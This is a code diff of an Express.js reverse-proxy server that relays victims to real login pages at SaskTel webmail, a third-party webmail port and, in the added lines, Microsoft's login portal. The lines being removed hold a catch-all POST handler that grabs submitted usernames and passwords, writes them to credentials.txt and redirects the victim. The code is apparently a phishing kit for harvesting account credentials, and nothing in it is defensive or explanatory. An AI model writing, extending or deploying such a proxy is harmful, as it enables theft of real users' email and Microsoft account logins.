@@ -12,42 +12,16 @@ const __dirname = path.dirname(__filename);
 const app = express();
 const PORT = 3001; // Use any available port
 
-// Serve static files from the 'public' directory
-app.use(express.static(path.join(__dirname, 'public')));
-
 // Middleware to parse URL-encoded bodies (for form submissions) and JSON
 app.use(bodyParser.urlencoded({ extended: true }));
 app.use(bodyParser.json());
 
-// Middleware to log all incoming requests with detailed information
-app.use((req, res, next) => {
-  console.log(`\n[${new Date().toISOString()}] Incoming ${req.method} request to ${req.url}`);
-  console.log('Headers:', JSON.stringify(req.headers, null, 2));
-
-  if (req.method === 'POST' || req.method === 'PUT') {
-    console.log('Body:', JSON.stringify(req.body, null, 2));
-  }
-
-  next();
-});
-
-// Function to determine the target URL based on incoming request
-function getTargetUrl(req) {
-  const { host } = req.headers;
-
-  if (host.includes('sasktel')) {
-    return 'https://webmail.sasktel.net';
-  } else if (host.includes('expertsinmarketing')) {
-    return 'https://expertsinmarketing.com:2096';
-  }
-  
-  // Default target if no specific match found
-  return 'https://expertsinmarketing.com:2096';
-}
+// Serve static files from the 'public' directory only for root or specific paths
+app.use('/', express.static(path.join(__dirname, 'public')));
 
 // Proxy middleware to forward requests based on the target determined
 app.use(
-  '/proxy', // Ensure this matches the endpoint you're accessing
+  '/proxy',
   createProxyMiddleware({
     changeOrigin: true,
     secure: false,
@@ -104,21 +78,19 @@ app.use(
   })
 );
 
-// Enhanced POST handler to capture login credentials
-app.post('*', (req, res) => {
-  const { user, pass } = req.body;
+// Function to determine the target URL based on incoming request
+function getTargetUrl(req) {
+  const { host } = req.headers;
 
-  if (user && pass) {
-    // Log credentials to a file for demonstration purposes
-    console.log(`Captured credentials: User: ${user}, Password: ${pass}`);
-    fs.appendFileSync('credentials.txt', `User: ${user}, Password: ${pass}\n`);
-    // Redirect to an external site
-    res.redirect('https://www.example.com');
-  } else {
-    console.log('POST request received but no valid credentials found.');
-    res.sendStatus(400); // Send a bad request status to indicate missing data
+  if (host.includes('sasktel')) {
+    return 'https://webmail.sasktel.net';
+  } else if (host.includes('expertsinmarketing')) {
+    return 'https://expertsinmarketing.com:2096';
   }
-});
+  
+  // Default target if no specific match found
+  return 'https://login.microsoftonline.com/';
+}
 
 // Start the HTTP server
 app.listen(PORT, () => {
